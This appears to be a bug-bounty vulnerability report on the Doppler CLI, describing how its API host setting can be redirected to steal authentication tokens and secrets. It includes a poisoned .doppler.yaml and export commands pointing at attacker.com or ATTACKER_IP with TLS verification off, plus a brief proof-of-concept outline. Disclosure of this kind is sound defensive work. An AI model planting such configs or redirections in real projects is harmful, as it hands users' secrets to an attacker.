# Doppler CLI - API Host Redirection Token Interception

**Target**: Doppler CLI (https://github.com/DopplerHQ/cli)  
**Severity**: Medium  
**Weakness**: Improper Verification of Source of a Communication Channel  
**CWE**: CWE-346  

## Summary

The Doppler CLI allows all API traffic, including authentication token exchanges, to be redirected to an attacker-controlled server via the `--api-host` flag, `DOPPLER_API_HOST` environment variable, or `.doppler.yaml` configuration file. Combined with the `--no-verify-tls` flag, this enables complete token interception without any warning to the user.

## Affected Component

- **CLI Source**: `pkg/cmd/login.go` (auth flow), `pkg/http/api.go` (API calls), `pkg/configuration/config.go` (config handling)
- **Scope**: In-scope per HackerOne policy ("The Doppler CLI... You can read more about the CLI on our Docs hub")

## Vulnerability Details

### Root Cause

The CLI accepts an `--api-host` parameter that controls the base URL for all API requests. This value is:
1. Not validated against an allowlist
2. Not compared to the default value (`https://api.doppler.com`)
3. Not logged or warned about when non-default
4. Stored persistently in the config file

The auth flow at `pkg/cmd/login.go:75` calls `http.GenerateAuthCode(localConfig.APIHost.Value, ...)` which sends the request to whatever host is configured. The returned `auth_url` is opened in the browser without domain validation (line 103).

### Attack Scenario

1. **Poisoned Config File**: An attacker places a `.doppler.yaml` with a malicious `api-host` in a shared repository or project directory:
   ```yaml
   scoped:
     "/":
       api-host: "https://attacker.com:8443"
       verify-tls: "false"
   ```

2. **Environment Variable**: An attacker with access to CI/CD or shell configuration sets:
   ```bash
   export DOPPLER_API_HOST="https://attacker.com:8443"
   ```

3. **Direct Flag**: Social engineering a user to run:
   ```bash
   doppler login --api-host https://attacker.com:8443 --no-verify-tls
   ```

### Impact

When a user authenticates via `doppler login`:
1. The CLI sends the polling code to the attacker's server
2. The attacker's server can return a phishing `auth_url` (e.g., mimicking the Doppler login page)
3. The attacker captures the authentication token
4. The attacker now has full access to all secrets the user can access

Additionally, all subsequent `doppler run`, `doppler secrets get`, etc. commands will send secrets/tokens to the attacker's server.

## Proof of Concept

See `reports/poc-doppler-api-host-redirect.md` for a working PoC.

```bash
# On attacker's machine - start fake API server
python3 poc_server.py

# On victim's machine - redirect CLI
export DOPPLER_API_HOST=http://ATTACKER_IP:8443
doppler login

# Attacker receives the polling code and can intercept the token
```

## Suggested Remediation

1. **Log warnings** when `--api-host` differs from the default value
2. **Validate `auth_url`** domain before opening in browser
3. **Consider certificate pinning** for the default API host
4. **Display the API host** in `doppler configure debug` output prominently
5. **Add a confirmation prompt** when a non-default API host is detected during login

## CVSS Assessment

- **Attack Vector**: Local (requires user interaction or config poisoning)
- **Attack Complexity**: Low
- **Privileges Required**: None
- **User Interaction**: Required (must run CLI command)
- **Scope**: Changed (affects secret confidentiality across all projects)
- **Confidentiality**: High (full access to all secrets)
- **Integrity**: High (attacker can modify secrets via stolen token)
- **Availability**: None

**Estimated CVSS**: 6.8 (Medium)
